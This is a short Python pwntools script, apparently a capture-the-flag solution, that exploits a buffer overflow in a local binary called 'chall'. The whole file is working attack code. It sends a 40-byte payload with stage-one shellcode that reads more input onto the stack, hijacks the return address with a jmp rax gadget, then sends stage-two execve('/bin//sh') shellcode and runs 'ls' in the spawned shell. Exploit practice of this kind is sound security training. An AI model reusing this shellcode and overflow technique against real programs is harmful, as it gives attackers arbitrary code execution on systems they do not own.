from pwn import *
import time

elf = context.binary = ELF('./chall')
p = process()

JMP_RAX = 0x4010cc
stage1 = bytes.fromhex('31ff31c0545e6a645a0f05ffe4')  
payload = stage1.ljust(40, b'\x90') + p64(JMP_RAX)
p.sendlineafter(b'shell?\n', payload)
time.sleep(0.3)
stage2 = b'\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05'
p.send(stage2)
time.sleep(0.3)
p.sendline(b'ls')
print(p.recvrepeat(timeout=2).decode(errors='replace'))
p.close()
